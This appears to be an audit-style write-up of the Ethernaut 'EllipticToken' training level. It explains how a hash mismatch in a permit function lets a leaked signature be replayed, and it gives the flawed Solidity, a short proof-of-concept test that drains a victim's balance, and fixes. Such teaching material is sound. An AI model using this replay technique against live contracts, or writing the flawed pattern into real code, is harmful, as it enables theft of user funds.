# [High] EllipticToken: permit uses a spoofable hash — attacker drains the signer's balance

## Summary
Target: `EllipticToken` (Ethernaut 2025 EllipticToken level, local training fixture).
The `permit` function approves a spender using a signature recovered over `bytes32(amount)` — a value the attacker can choose — while the one-time guard checks a *different* hash (`keccak256(abi.encode(amount))`). By setting `amount = uint256(voucherHash)` (a value ALICE already signed), the attacker reuses ALICE's leaked signature to approve themselves as spender and drain ALICE's balance.

## Severity
**High** — attacker drains a victim's entire token balance using a signature the victim signed for a different purpose.

## Vulnerability Details
```solidity
function permit(uint256 amount, address spender, bytes calldata tokenOwnerSignature, bytes calldata spenderSignature) external {
    bytes32 permitHash = keccak256(abi.encode(amount));
    require(!usedHashes[permitHash], "permit already used");
    require(!usedHashes[bytes32(amount)], "permit already used");
    address tokenOwner = _recover(bytes32(amount), tokenOwnerSignature);
    _approve(tokenOwner, spender, amount);
    // ... spenderSignature check
}
```
Two flaws combine:
1. **Hash mismatch**: the guard checks `keccak256(abi.encode(amount))` but the signature is recovered over `bytes32(amount)` — two different values. An attacker can pick `amount` such that `bytes32(amount)` equals a hash the victim already signed (the leaked voucher hash), while `keccak256(abi.encode(amount))` is a fresh, un-used key.
2. **Signature reuse**: ALICE's leaked signature (over the voucher hash) is replayed as `tokenOwnerSignature` because `bytes32(amount) == voucherHash`. The recovered `tokenOwner` is ALICE, so the attacker becomes an approved spender for ALICE.

## Proof of Concept
```solidity
function testEllipticTokenExploit() public {
    // ALICE's leaked voucher signature signs voucherHash = keccak256(encodePacked(amount, ALICE, salt))
    // attacker sets amount = uint256(voucherHash) so bytes32(amount) == voucherHash
    uint256 amount = uint256(voucherHash);
    token.permit(amount, attacker, aliceSpoofedSignature, attackerSig);
    token.transferFrom(ALICE, attacker, token.balanceOf(ALICE)); // drain
    assertEq(token.balanceOf(ALICE), 0); // goal reached
}
```

## Impact
- Full drain of any user whose signature was used elsewhere (cross-protocol signature reuse).
- The attacker controls `amount`, so the approval value is attacker-chosen (can be the full balance).

## Recommendation / Fix
1. Recover the signature over a **domain-separated, purpose-bound hash** (e.g. `keccak256(abi.encode(chainId, address(this), msg.sender, amount, nonce))`) — never over a bare `bytes32(amount)`.
2. Make the one-time guard cover the **same hash** that is recovered.

## References
- EIP-2612 (permit) — proper domain separator + nonce design.
- Signature-reuse / cross-protocol replay class.
